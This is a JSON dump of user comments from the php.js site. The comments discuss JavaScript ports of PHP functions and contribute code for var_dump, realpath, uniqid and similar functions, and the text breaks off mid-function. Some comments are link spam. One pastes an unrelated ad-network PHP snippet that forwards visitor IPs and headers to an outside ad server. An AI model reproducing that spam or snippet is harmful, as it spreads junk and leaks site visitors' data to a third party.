date_default_timezone_set(), but I've found all functions that use timezone_abbreviations_list() returns always: \"InternalError: too much recursion\".\nTested on Firefox 3.6.24, but also on more recent version 7.0.1.\n\nThanks very much for your work!\nBye!"}],"putenv":[{"date":"2009-08-29 15:06:19","author":"run","url":"","comment":"You know, with stuff like this, this whole library is just starting to get silly.\n\nC'mon guys, get serious..."},{"date":"2009-08-30 03:35:27","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Is it silly to have an environment variable or putenv() function in PHP? If you think so, fine, but we are just letting our users decide what aspects they wish to port over.\n\nAnd I see no intrinsic difference between needing an environmental variable in PHP and one in JavaScript especially with uses of JavaScript going beyond far beyond client-side HTML only (and our adding it in JavaScript is hardly adding much overhead nor is it a black box); this function can be made to work with other functions, as setlocale() already does--it's not just making an environmental variable that does absolutely nothing.\n\nAnd no one is compelling anyone to use a function they don't want to, nor is this function even a part of the default package... I fail to see how one not-so-useful function (if this even is one) is affecting the rest of the library. I'd understand if you were talking about something like phpcredits() (we have that under experimental for the heck of it--sometimes one just does something \"for the heck of it\", you know--call it art, boredom or whatever), but this does actually have a potential use.\n\nIf the PHP community feels it warranted to deprecate some items, we have moved such functions into our experimental section. Otherwise, there's nothing that makes me want to scream more (and thus I don't want to be someone who does this to others) than developers who confidently make abrupt decisions for everyone as far as what aspects of an already well-established API are \"good\" and which are not, and thereby limiting my and everyone else's creative choices. Let me as a user decide which is good and which is not, unless it really is a practice which is really likely to harm me (e.g., register globals) or encourage me to really make a big mess of things (e.g., an unfettered goto).\n\nI hope my tone is not harsh when I say this (and this is not my library anyways), but I don't care so much about what the \"cool crowd\" is doing and would rather have fun and do what is convenient or interesting for myself and others--letting a rationale, constructive, and friendly dialog decide this rather than a dogma-by-silent-consensus and fear of going against the grain masquerading itself as \"best practice\". One can learn a lot more by seeing through one's own eyes in avoiding fears of what others think (and that is another stated purpose of Kevin's library--for students)--something which is helped along by a supportive atmosphere such as Kevin has engendered...\n\nSome poorly implemented functions, on the other hand, could definitely, if unfairly, ruin the impression of the library for some (one reason we really need to get more tests in place and debug older functions), but this is, I think, a wholly different issue. If someone is so afraid of what others think that they will let one \"silly\" but accurate port cause them to forgo choosing from 400-500 other potentially useful and independent functions, then that is just, imho, a loss for them.\n\nBut feel free to contradict me if you can offer some concrete reasons that I've missed..."},{"date":"2009-09-04 18:38:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"If I was only creating the functions I needed. This site would have 6.\n\nBut looking at the site's stats, apparently there are many people out there that use many more.\n\nYou also have to think about people using these functions in non-browser environments like node.js & rhino.\n\nAnyway. My point is: who are we to decide who is to use what. So it's a lot easier for us to just go ahead & port everything, and let the user decide what to pick.\n\nRemember. You can compile your own packages."},{"date":"2012-03-22 13:55:58","author":"??????? ? ??????","url":"http:\/\/an3m1.com\/","comment":"New and exclusive news and new articles in the world of Rate "}],"setlocale":[{"date":"2012-05-06 09:40:36","author":"????? ????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas \n"},{"date":"2012-06-14 03:08:04","author":"Mathieu M-Gosselin","url":"http:\/\/www.qc-net.com","comment":"I rewrote _copy (lines 23 to 38) to correctly take into account simple arrays (containing integers, strings or booleans) when copying, instead of casting them to objects, which caused problems when trying to access the .length property (that objects don't have, but arrays do). (I discovered that problem while using phpjs' money_format() and trying to copy locales. If, for example, the en_US LC_MONETARY.mon_grouping wasn't redefined (as it is) after cloning it from en, the thousands grouping would plainly not work, while it should.\n\nhttp:\/\/jsfiddle.net\/jHGBR\/ or\n\n[CODE]\n\/\/ BEGIN STATIC\nvar _copy = function _copy(orig) {\n    if (orig instanceof RegExp) {\n        return new RegExp(orig);\n    } else if (orig instanceof Date) {\n        return new Date(orig);\n    }\n\n    if( Object.prototype.toString.call( orig ) === '[object Array]' )\n    {\n        return orig.slice(0);\n    }\n    else\n    {\n        var newObj = {};\n\n        for (var i in orig) {\n            if (typeof orig[i] === 'object') {\n                newObj[i] = _copy(orig[i]);\n            } else {\n                newObj[i] = orig[i];\n            }\n        }\n        return newObj;\n    }\n};\u200b\n[\/CODE]\n\nSources:\nhttp:\/\/stackoverflow.com\/questions\/4690520\/javascript-object-literal-length-undefined\nhttp:\/\/stackoverflow.com\/questions\/4775722\/javascript-check-if-object-is-array\nhttp:\/\/my.opera.com\/GreyWyvern\/blog\/show.dml\/1725165"}],"strftime":[{"date":"2011-11-09 15:05:47","author":"Kaushik","url":"","comment":"I always suggest this website as one of the best javascript vendor. Beside of that this function is much important in php so as in js now. Thanks for the developers who have created it. Best regards to them and also this site owner. Tremendous job guys. keep on."},{"date":"2012-06-16 08:15:52","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Kaushik: Glad to hear it is helpful--thanks for the feedback!"}],"phpversion":[{"date":"2011-04-01 23:04:37","author":"lala","url":"lala.lala","comment":"lala lala lala lala lala"},{"date":"2011-05-04 06:27:40","author":"qqq","url":"http:\/\/www.google-igoogle.com\/","comment":"<?php\n\/\/ MobGold Publisher Install Code\n\/\/ Language: PHP (curl)\n\/\/ Version: MG-20110322\n\/\/ Copyright MobGold Ltd, All rights reserved\n\n\/\/ Parameters to make MobGold request\n$site_id    = '02f800ffRZNkRa';\t\/\/ site_id is required to request ads from MobGold\n$version    = 'MG-20110322';\n$test_mode  = 0;  \/\/ Set 1 for test mode, set 0 for live mode\n\n\/\/ Optional parameter\n$ad_type    = \"\"; \/\/ 0 = both, 1 = text, 2 = banner\n$ad_lang    = \"\"; \/\/ EN, AR, ZZ, EN, FR, DE, ID, IT, JA, PT, RU, ES, TH, OT\n\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\n\/\/ Do not edit below this line \/\/\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\n\n\/\/ This section defines MobGold functions and should be used AS IS.\n\n$protocol = 'http';\nif (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) != 'off') $protocol = 'https';\n$tps \t= isset( $_SERVER[\"HTTPS\"] ) ? $_SERVER[\"HTTPS\"] : '';\n$ua \t= isset( $_SERVER[\"HTTP_USER_AGENT\"] ) ? $_SERVER[\"HTTP_USER_AGENT\"] : '';\n$ua \t= isset( $_SERVER[\"HTTP_X_OPERAMINI_PHONE_UA\"] ) ? $_SERVER[\"HTTP_X_OPERAMINI_PHONE_UA\"] : $ua;\n$ua \t= isset( $_SERVER[\"HTTP_X_ORIGINAL_USER_AGENT\"] ) ? $_SERVER[\"HTTP_X_ORIGINAL_USER_AGENT\"] : $ua;\n$ua \t= isset( $_SERVER[\"HTTP_X_DEVICE_USER_AGENT\"] ) ? $_SERVER[\"HTTP_X_DEVICE_USER_AGENT\"] : $ua;\n$xwp\t= isset( $_SERVER[\"HTTP_X_WAP_PROFILE\"] ) ? $_SERVER[\"HTTP_X_WAP_PROFILE\"] : '';\n$pro \t= isset( $_SERVER[\"HTTP_PROFILE\"] ) ? $_SERVER[\"HTTP_PROFILE\"] : '';\n$xwc \t= isset( $_SERVER[\"HTTP_X_WAP_CLIENTID\"] ) ? $_SERVER[\"HTTP_X_WAP_CLIENTID\"] : '';\n$ipr \t= isset( $_SERVER[\"REMOTE_ADDR\"] ) ? $_SERVER[\"REMOTE_ADDR\"] : '';\n$ipx \t= isset( $_SERVER[\"HTTP_X_FORWARDED_FOR\"] ) ? $_SERVER[\"HTTP_X_FORWARDED_FOR\"] : '';\n$ipc \t= isset( $_SERVER[\"HTTP_CLIENT_IP\"] ) ? $_SERVER[\"HTTP_CLIENT_IP\"] : '';\n$ref \t= isset( $_SERVER[\"HTTP_REFERER\"] ) ? $_SERVER[\"HTTP_REFERER\"] : '';\n$hos \t= isset( $_SERVER[\"HTTP_HOST\"] ) ? $_SERVER[\"HTTP_HOST\"] : '';\n$uri \t= isset( $_SERVER[\"REQUEST_URI\"] ) ? $_SERVER[\"REQUEST_URI\"] : '';\n$acp \t= isset( $_SERVER[\"HTTP_ACCEPT\"] ) ? $_SERVER[\"HTTP_ACCEPT\"] : '';\n$cha \t= isset( $_SERVER[\"HTTP_ACCEPT_CHARSET\"] ) ? $_SERVER[\"HTTP_ACCEPT_CHARSET\"] : '';\n$lan \t= isset( $_SERVER[\"HTTP_ACCEPT_LANGUAGE\"] ) ? $_SERVER[\"HTTP_ACCEPT_LANGUAGE\"] : '';\n\n$mg_params = array(\n\t'ua=' . urlencode($ua),\n\t'xwp=' . urlencode($xwp),\n\t'pro=' . urlencode($pro),\n\t'xwc=' . urlencode($xwc),\n\t'ipr=' . urlencode($ipr),\n\t'ipx=' . urlencode($ipx),\n\t'ipc=' . urlencode($ipc),\n\t'ref=' . urlencode($ref),\n\t'hos=' . urlencode($hos),\n\t'uri=' . urlencode($uri),\n\t'acp=' . urlencode($acp),\n\t'cha=' . urlencode($cha),\n\t'lan=' . urlencode($lan),\n\t'pt=' . urlencode(\"$protocol:\/\/\" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']),\n\t'sm=' . $site_id,\n\t'ver=' . urlencode($version),\n\t'test=' . $test_mode,\n\t'type=' . $ad_type,\n\t'lang=' . $ad_lang,\n);\n\n$post = implode('&', $mg_params);\n$request = curl_init();\n$request_timeout = 5; \/\/ 5 seconds timeout\t\ncurl_setopt($request, CURLOPT_URL, 'http:\/\/ads.mobgold.com\/request.php');\ncurl_setopt($request, CURLOPT_RETURNTRANSFER, 1);\ncurl_setopt($request, CURLOPT_TIMEOUT, $request_timeout);\ncurl_setopt($request, CURLOPT_CONNECTTIMEOUT, $request_timeout);\ncurl_setopt($request, CURLOPT_HTTPHEADER, array('Content-Type: application\/x-www-form-urlencoded', 'Connection: Close'));\ncurl_setopt($request, CURLOPT_POSTFIELDS, $post);\n$mg_contents = curl_exec($request);\ncurl_close($request);\n\nif( null !== $mg_contents )\n    echo $mg_contents;\n?>"}],"var_dump":[{"date":"2009-08-03 20:33:16","author":"joelwallis","url":"joelwallis.net","comment":"Very good idea!"},{"date":"2010-02-23 22:38:46","author":"Ben","url":"","comment":"Doesn't seem to work in Chrome, only worked in Firefox :("},{"date":"2010-02-24 00:25:46","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Ben: Can you give the example code you used to test?"},{"date":"2010-03-06 20:37:09","author":"Zahlii","url":"","comment":"I changed that .js a bit.\nNow it is able to:\n\n* var_dump functions\n* var_dump Date(s) as String\n\n[code]\nfunction var_dump () {\n    var output = \"\", pad_char = \" \", pad_val = 4, lgth = 0, i = 0, d = this.window.document;\n    var getFuncName = function (fn) {\n        var name = (\/\\W*function\\s+([\\w\\$]+)\\s*\\(\/).exec(fn);\n        if (!name) {\n            return '(Anonymous)';\n        }\n        return name[1];\n    };\n    var repeat_char = function (len, pad_char) {\n        var str = \"\";\n        for (var i=0; i < len; i++) {\n            str += pad_char;\n        }\n        return str;\n    };\n    var getScalarVal = function (val) {\n        var ret = '';\n        if (val === null) {\n            ret = 'NULL';\n        }\n        else if (typeof val === 'boolean') {\n            ret = 'bool('+val+')';\n        }\n        else if (typeof val === 'string') {\n            ret = 'string('+val.length+') \"'+val+'\"';\n        }\n        else if (typeof val === 'number') {\n            if (parseFloat(val) == parseInt(val, 10)) {\n                ret = 'int('+val+')';\n            }\n            else {\n                ret = 'float('+val+')';\n            }\n        }\n        else if (val === undefined) {\n            ret = 'UNDEFINED'; \/\/ Not PHP behavior, but neither is undefined as value\n        }\n        else if (typeof val === 'function') {\n            ret = 'FUNCTION'; \/\/ Not PHP behavior, but neither is function as value\n\t\t\tret = val.toString().split(\"\\n\");\n\t\t\ttxt = \"\";\n\t\t\tfor(var j in ret) {\n\t\t\t\ttxt+= (j !=0 ? thick_pad : '')+ret[j]+\"\\n\";\n\t\t\t}\n\t\t\tret = txt;\n        }\n\t\telse if(val instanceof Date) {\n\t\t\tval = val.toString();\n\t\t\tret = 'string('+val.length+') \"'+val+'\"'\n\t\t}\n\t\telse if(val.nodeName) {\n\t\t\tret = 'HTMLElement(\"'+val.nodeName.toLowerCase()+'\")';\n\t\t}\n        return ret;\n    };\n    var formatArray = function (obj, cur_depth, pad_val, pad_char) {\n        var someProp = '';\n        if (cur_depth > 0) {\n            cur_depth++;\n        }\n        base_pad = repeat_char(pad_val*(cur_depth-1), pad_char);\n        thick_pad = repeat_char(pad_val*(cur_depth+1), pad_char);\n        var str = \"\";\n        var val='';\n        if (typeof obj === 'object' && obj !== null) {\n            if (obj.constructor && getFuncName(obj.constructor) === 'PHPJS_Resource') {\n                return obj.var_dump();\n            }\n            lgth = 0;\n            for (someProp in obj) {\n                lgth++;\n            }\n            str += \"array(\"+lgth+\") {\\n\";\n            for (var key in obj) {\n                if (typeof obj[key] === 'object' && obj[key] !== null && !(obj[key] instanceof Date) && !obj[key].nodeName) {\n                    str += thick_pad + \"[\"+key+\"] =>\\n\"+thick_pad+formatArray(obj[key], cur_depth+1, pad_val, pad_char);\n                } else {\n                    val = getScalarVal(obj[key]);\n                    str += thick_pad + \"[\"+key+\"] =>\\n\"+  thick_pad +val + \"\\n\";\n                }\n            }\n            str += base_pad + \"}\\n\";\n        } else {\n            str = getScalarVal(obj);\n        }\n        return str;\n    };\n    output = formatArray(arguments[0], 0, pad_val, pad_char);\n    for (i=1; i < arguments.length; i++) {\n        output += '\\n'+formatArray(arguments[i], 0, pad_val, pad_char);\n    }\n\treturn output;\n}\n[\/code]"},{"date":"2010-03-10 14:30:54","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Thanks, Zahlii! I've committed some changes to http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/var\/var_dump.js . I removed a global, added support for RegExp, cleaned up the function appearance a little and added more support for other DOM node types, and cleaned up. If you want to get a string returned, use var_export() (as in PHP) with the second argument set to true. We don't currently support output buffering."},{"date":"2011-04-20 03:09:54","author":"ekim","url":"","comment":"Can it dump RA or curse defined as :\n\n[CODE]\nRA=[]; RA[1]=RA;\ncurse={re:RA}; curse.s=curse;\n[\/CODE]\n?\n\nIf so, can the output be posted to see how it's represented?"}],"realpath":[{"date":"2009-10-19 00:49:14","author":"cuisdy","url":"","comment":"Hi there, thanks for that script.\n\nHowever, I was looking for a path resolver that would return a relative path resolved, not an absolute path resolved. I decided to do one myself and it works for me (though I haven't tested \u00fcber weird inputs, so it's up for testing and improvements). Just in case someone wants it, here it is:\n\n(hope it posts the code nicely formatted hehe)\n\n[CODE]\nfunction resolvePath( sPath ){\n\t\n\tsPath = sPath.replace(\/\\\\\/g,'\/');\t\t\/\/ Linux compatible\n\tsPath = sPath.replace(\/\\\/\\\/\/g,'\/');\t\t\/\/ Fix double bars\n\tvar aPathParts = sPath.split('\/');\t\t\/\/ Get parts of the path\n\t\n\tfor( var i=0, letsStart, sPart ; sPart = aPathParts[i] ; i++ ){\n\t\tif( sPart != '..'  ){\n\t\t\tletsGo = true;\n\t\t\tcontinue;\n\t\t};\n\t\tif( letsStart && sPart == '..' ){\n\t\t\taPathParts.splice((i-1),2);\n\t\t\ti=i-2;\n\t\t}\n\t};\n\t\n\treturn aPathParts.join('\/');\n\t\n};\n[\/CODE]\n\nDoes PHP have a function like this, by the way?"},{"date":"2009-10-19 00:52:43","author":"cuisdy","url":"","comment":"No laughing at me, please... \n\nWhere it said \"letsGo\" it should say \"letsStart\". It's just the most silly variable name I could come up with, I know."},{"date":"2009-10-25 14:01:50","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ cuisdy: We only port actual PHP functions, but given the amount of visitors coming here, I'm sure someone will run into your function and find it useful. So thanks for the code! "},{"date":"2010-07-27 01:03:00","author":"SoutlinK","url":"http:\/\/www.halospain.com","comment":"This funcion contains an error.\n\nIf you are using hash, with slash '\/' it will brokes\n\nExample\n\n[code]\nwindow.location.href = 'http:\/\/localhost\/phpbb3\/foros\/index.php#\/phpbb3\/foros\/viewforum.php?f=2'\n\n\nvar relativepath = '.\/viewforum.php?f=2';\nconsole.log(realpath(href));\n[\/code]\n\nWill output http:\/\/localhost\/phpbb3\/foros\/index.php#\/phpbb3\/foros\/viewforum.php?f=2\n\nI thinks its a big error ;)\n\nFIX\n\n[code]\nvar r = this.window.location.href;\nif (r.indexOf('#') != -1)\n{\nr.substring(0,r.indexOf('#'));\n}\n[\/code]"},{"date":"2010-07-27 01:12:30","author":"SoutlinK","url":"http:\/\/www.halospain.com","comment":"Ups I made a Mistake in fix\n\n[code]\nif (r.indexOf('#') != -1)\n\t{\n\t\tr = r.substring(0,r.indexOf('#'));\n\t}\n[\/code]\n"},{"date":"2012-02-22 03:12:03","author":"friv 4 school","url":"http:\/\/www.friv4.us\/","comment":"Nice share. Thanks a lots."},{"date":"2012-06-12 05:43:22","author":"cutegirl","url":"http:\/\/www.kizi.5ire.com\/","comment":"Nice share info <a href=\"http:\/\/www.kizi.5ire.com\/>Kizi<\/a>"},{"date":"2012-06-14 04:12:05","author":"Kizi","url":"http:\/\/kizi.5ire.com\/","comment":"Thank your share info!"},{"date":"2012-07-05 05:49:50","author":"Friv","url":"http:\/\/www.friv.name","comment":"Thanks for sharing.\nI was found this coding."},{"date":"2012-07-19 05:02:13","author":"Gazo games","url":"http:\/\/www.gazogames.in\/","comment":"JavaScript is very important in making situation it helps programmers create web pages to help users easily share .. thank you ...!"},{"date":"2012-07-20 02:58:47","author":"Friv","url":"http:\/\/www.frivteen.com\/","comment":"Thanks for share code"},{"date":"2012-07-20 03:01:46","author":"Huz","url":"http:\/\/www.huz.name\/","comment":"thanks a lot, this code i was found."},{"date":"2012-07-22 10:42:15","author":"Game gazo","url":"http:\/\/www.gamegazo.com\/","comment":"thanks for share this code"},{"date":"2012-08-03 10:13:42","author":"Bored","url":"http:\/\/www.boredgames.name\/","comment":"Nice share info.Thanks you..!"}],"uniqid":[{"date":"2009-04-14 17:53:59","author":"Michael Grier","url":"http:\/\/mgrier.com\/te5t\/uniqid-source.txt","comment":"Here's the 5.2.9 source for uniqid.c and lcg.c\n\nhttp:\/\/mgrier.com\/te5t\/uniqid-source.txt\n(you can click my name for same page)\n\nHere's the short version of \"more_entropy\"\n\n[CODE]\n\/*\n * combinedLCG() returns a pseudo random number in the range of (0, 1).\n * The function combines two CGs with periods of \n * 2^31 - 85 and 2^31 - 249. The period of this function\n * is equal to the product of both primes.\n *\/\n[\/CODE]"},{"date":"2009-04-15 03:18:29","author":"Brett Zamir","url":"","comment":"Hi Michael, \n\nWhile it's great to use heavier algorithms, such as in the PHP source, I think our initial focus is on replicating the PHP API regardless of implementation--if you can make any implementations more robust (and\/or speed them up), go for it! :)"},{"date":"2009-04-15 15:42:46","author":"Michael Grier","url":"","comment":"That wasn't my point. Kevin just mentioned in the comments of the function that \"we need to checkout the PHP source to find out how they generate this exactly,\" so since nobody else \"seemed\" to have done this (there are no other comments here about it), I looked for and posted the source."},{"date":"2009-04-16 00:14:07","author":"Brett Zamir","url":"","comment":"Aha...Gotcha...Thanks"},{"date":"2009-04-19 23:26:43","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael Grier: That was exactly what I needed :D great. I will process the C code when I find the time. Thanks a lot, I'll make sure to mention your name in the final version."},{"date":"2009-05-29 23:34:31","author":"Kankrelune","url":"http:\/\/www.webfaktory.info\/","comment":"I did the conversion. It works correctly, there are some collisions when more_entropy is false, but nothing really bad + \/ - 50 or 60 per 10,000 id created with the same prefix ...\n\n-> http:\/\/img33.imageshack.us\/img33\/1899\/testsa.png\n\n[CODE]\n\/\/ uniqid( [ str prefix, [ bool more_entropy ]])\n\/\/ Generate a unique ID \n\/\/ +     original by: Kankrelune (http:\/\/www.webfaktory.info\/)\n\/\/ -     depends on: sprintf\n\/\/ *     example 1: uniqid();\n\/\/ *     returns 1: 4a2027b600c14\n\/\/ *     example 2: uniqid( time());\n\/\/ *     returns 2: 12436214644a20285a07b3f\n\/\/ *     example 3: uniqid( time(), true);\n\/\/ *     returns 3: 12436214644a20285b1cd361.31879087\nfunction uniqid( prefix, more_entropy)\n{\n    if(typeof prefix == 'undefined')\n        prefix = \"\";\n        \n    var now, sec, usec;\n    now = new Date().getTime()\/1000;\n    sec = parseInt(now,10);\n    usec = Math.round((now-sec)*1000)\/1000;\n    \n    if(more_entropy) \/\/ for more entropy we add a float lower to 10\n        return sprintf(\"%s%08x%05x%s\",prefix,sec,(usec*(Math.random()*999999)),(Math.random()*10).toFixed(8));\n    \n    return sprintf(\"%s%08x%05x\",prefix,sec,(usec*(Math.random()*999999)));\n}\n[\/CODE]\n\n@ tchaOo\u00b0"},{"date":"2009-05-31 15:07:29","author":"Kankrelune","url":"http:\/\/www.webfaktory.info\/","comment":"Updated version without sprintf() dependencie and a lower collisions ratio (30\/10.000)...\n\n[CODE]\n\/\/ uniqid( [ str prefix, [ bool more_entropy ]])\n\/\/ Generate a unique ID \n\/\/ +     original by: Kankrelune (http:\/\/www.webfaktory.info\/)\n\/\/ *     example 1: uniqid();\n\/\/ *     returns 1: 4a2027b600c14\n\/\/ *     example 2: uniqid( time());\n\/\/ *     returns 2: 12436214644a20285a07b3f\n\/\/ *     example 3: uniqid( time(), true);\n\/\/ *     returns 3: 12436214644a20285b1cd361.31879087\n\nfunction uniqid( prefix, more_entropy)\n{\n    if(typeof prefix == 'undefined')\n        prefix = \"\";\n    \n    var now, sec, usec;\n    var formatBase = function(value, reqWidth) {\n        value = (value >>> 0).toString(16);\n        \n        if (reqWidth > value.length)\n            return Array(1 + (reqWidth - value.length) >>> 0).join('0') + value;\n        if (reqWidth < value.length)\n            return value.slice(0,reqWidth);\n        \n        return value;\n    };\n    var getRandSeed = function() {\n        return [\n                0xa524,0x11f9b,0x11c3a,0x7f5e,0xbe31,0x585a,0xc9c9,0xbee7,0x6a0f,0x8cb2,\n                0x713e,0x11b99,0x4b7f,0x81f9,0x5e8d,0x15f34,0x57a9,0x10658,0x300d,0xa5da,\n                0x13150,0xdf23,0x31b5,0x16fbc,0x17260,0xda84,0x15d13,0x17dc4,0x6263,0x11909,\n                0x147ab,0x99b0,0xacf1,0x10da2,0xeb0f,0x9616,0x3e5b,0xd8dd,0x9331,0x13cb4,\n                0x6701,0x148e3,0x139a4,0x4e74,0x6e6c,0x1230a,0x73e9,0x4b87,0x49c2,0x1357a,\n                0x96cb,0x5010,0x9bc6,0x4588,0x9306,0x18107,0x1599f,0x7c97,0x16229,0x441c\n            ][Math.floor( ( Math.random( ) * this.length ) )];\n    };\n    var makeSeed = function(seed) {\n        return seed * ((((Math.random() * getRandSeed()) * (Math.random() * getRandSeed())) * getRandSeed()) * getRandSeed());\n    };\n    now = new Date().getTime()\/1000;\n    sec = parseInt(now,10);\n    usec = Math.round((now-sec)*1000)\/1000;\n   \n    if(more_entropy) \/\/ for more entropy we add a float lower to 10\n        return prefix+formatBase(sec,8)+formatBase(makeSeed(usec),5)+(Math.random()*10).toFixed(8);\n    \n    return prefix+formatBase(sec,8)+formatBase(makeSeed(usec),5);\n}\n[\/CODE]\n\n@ tchaOo\u00b0"},{"date":"2009-05-31 19:24:20","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Kankrelune: Thanks a lot for investing your time! I would really like to have the implementation like PHP, but it still needs some work. Checkout comments here:\n\nhttp:\/\/trac.plutonia.nl\/projects\/phpjs\/browser\/trunk\/functions\/misc\/uniqid.js"},{"date":"2009-05-31 20:44:20","author":"Kankrelune","url":"http:\/\/www.webfaktory.info\/","comment":"Hi... i have allredy think to store the ids and re generate if collision but i don't like this idea... and i don't like the 3rd parameter... .. . :o)\n\nOn the last test i have 20\/35 collisions for 10.000 ids generate with the same prefix... for me 0.2% of collision it's more like PHP than a 3rd parameter... .. . ;o)\n\nI know where is the problem... i work on when i have time... .. .\n@ tchaOo\u00b0\n\nps: sorry for my english"},{"date":"2009-05-31 21:01:29","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Kankrelune: Agreed but I believe the way it's set up now it will only generate a new number every second. If this function is used in a loop, you may get many iterations ( ids ) per second, and so there's nothing really unique about those.\n\nIf we fix the bug it will be much better, for now I have to leave the current implementation in tact though."},{"date":"2009-06-01 11:28:24","author":"Kankrelune","url":"http:\/\/www.webfaktory.info\/","comment":"Hi... you're revisited version don't work...\n\non start replace \n\n[CODE]\nprefix +=  '';\n[\/CODE]\n\nby the original code...\n\n[CODE]\nif(typeof prefix == 'undefined')\n    prefix = \"\";\n[\/CODE]\n\ni have made this for a simple cause... an undefined var is casted to a string she's transformed to a string with for contents \"undefined\" and after the ids is malformed...\n\nundefinded4a2027b600c14\n\nI think it's not a good idea to use an uniqid var on the uniqid function... it's a risk to dev confusion and namespace collision (? i speak english same as a spanish cow lol)\n\nrename he to id or other is better... same for...\n\n[CODE]\nreturn this.uniqid(prefix, more_entropy, reduce_collision);[\/CODE]\n\n>>\n\n[CODE]\nreturn uniqid(prefix, more_entropy, reduce_collision);\n[\/CODE]\n\nBye"},{"date":"2009-06-01 16:32:23","author":"Kankrelune","url":"http:\/\/www.webfaktory.info\/","comment":"Final version without collisions...\n\n[CODE]\nfunction uniqid( prefix, more_entropy)\n{\n    \/\/ string uniqid( [ str prefix, [ bool more_entropy ]])\n    \/\/ Generates a unique ID  \n    \/\/ \n    \/\/ version: \n    \/\/ discuss at: http:\/\/phpjs.org\/functions\/uniqid\n    \/\/ +   original by: Kankrelune (http:\/\/www.webfaktory.info\/)\n    \/\/ *     example 1: uniqid();\n    \/\/ *     returns 1: 'a30285b160c14'\n    \/\/ *     example 2: uniqid('foo');\n    \/\/ *     returns 2: 'fooa30285b1cd361'\n    \/\/ *     example 3: uniqid('bar', true);\n    \/\/ *     returns 3: 'bara20285b23dfd1.31879087'\n    if(typeof prefix == 'undefined')\n        prefix = \"\";\n    \n    var retId;\n    var formatSeed = function(seed, reqWidth) {\n        seed = parseInt(seed,10).toString(16); \/\/ to hex str\n        if (reqWidth < seed.length) { \/\/ so long we split\n            return seed.slice(seed.length - reqWidth);\n        }\n        if (reqWidth > seed.length) { \/\/ so short we pad\n            return Array(1 + (reqWidth - seed.length)).join('0')+seed;\n        }\n        return seed;\n    };\n    \n    \/\/ BEGIN REDUNDANT\n    if (!this.php_js) {\n        this.php_js = {};\n    }\n    \/\/ END REDUNDANT\n    if (!this.php_js.uniqidSeed) { \/\/ init seed with big random int\n        this.php_js.uniqidSeed = Math.floor(Math.random() * 0x75bcd15);\n    }\n    this.php_js.uniqidSeed++;\n    \n    retId = prefix; \/\/ start with prefix, add current milliseconds hex string \n    retId += formatSeed(parseInt(new Date().getTime()\/1000,10),8);\n    retId += formatSeed(this.php_js.uniqidSeed,5); \/\/ add seed hex string\n    \n    if(more_entropy) \/\/ for more entropy we add a float lower to 10\n        retId += (Math.random()*10).toFixed(8).toString();\n    \n    return retId;\n}\n[\/CODE]\n\ntested on 500.000 ids generated with the same prefix... .. . ;o)\n\n@ tchaOo\u00b0"},{"date":"2009-06-01 16:35:15","author":"Kankrelune","url":"http:\/\/www.webfaktory.info\/","comment":"the code is not complete... it's a strange bug i have the same when i post version_compare()\n\nhttp:\/\/www.webfaktory.info\/uniqid.txt\n\n@ tchaOo\u00b0"},{"date":"2009-06-02 10:52:38","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Kankrelune: Great job! Added!\n\n(ps: I don't see a difference between the text file you uploaded and the source below, seems ok? am I not seeing it or was it different before?)"},{"date":"2009-06-02 16:18:30","author":"Kankrelune","url":"http:\/\/www.webfaktory.info\/","comment":"Yes me to... i don't see the difference today but the code is not the same than yesterday... a cache problem or i don't know... i was not drunked yet... lol... .. .\n\n@ tchaOo\u00b0"},{"date":"2009-06-10 14:38:03","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Kankrelune: Ok must be a caching issue then. I will try and see if I can reproduce it."},{"date":"2011-12-18 23:10:53","author":"Mehmet Hazar Artuner","url":"hazarartuner.com \/ under construction","comment":"thank you so much, you saved my life :D :D"}],"ctype_alnum":[{"date":"2012-06-11 04:02:40","author":"CyberCrasher","url":"","comment":"It produces this error:\nUncaught TypeError: Object [object Window] has no method 'setlocale' "},{"date":"2012-06-11 04:44:34","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@CyberCrasher: Please note the field that it depends on \"setlocale\", another function."}],"classkit_import":[{"date":"2011-12-19 13:08:18","author":"hdfghddf","url":"","comment":"dfgr dhfgdh"}],"classkit_method_add":[{"date":"2012-04-24 14:19:10","author":"aa","url":"aa","comment":"aaa"}],"convert_uuencode":[{"date":"2009-04-25 20:09:31","author":"Ole Vrijenhoek","url":"www.nervous.nl","comment":"I did some reaearch for this function,\nin php it uses linebreaks and stuff...\nI fixed it with this function\n\n[CODE]\n\/\/ author: Ole Vrijenhoek\n\/\/ sources: http:\/\/www.herongyang.com\/encoding\/UUEncode-PHP-Implementation.html\n\/\/          http:\/\/en.wikipedia.org\/wiki\/Uuencode\n\/\/ depends on is_scalar()\n\nfunction convert_uuencode(str){\n\n        \/\/ shortcut\n        var char = function(c) {\n            return String.fromCharCode(c);\n        };\n\n        if(!str || str==\"\") {\n            return char(0);\n        } else if(!is_scalar(str)) {\n            return false;\n        }\n\n        var c = 0, u = 0, i = 0, a = 0\n        var encoded = \"\", tmp1 = \"\", tmp2 = \"\", bytes = {}, b = {};\n        var b0 = 0, b1 = 0, b2 = 0, b3 = 0;\n\n        \/\/ divide string into chunks of 45 characters\n        var chunk = function() 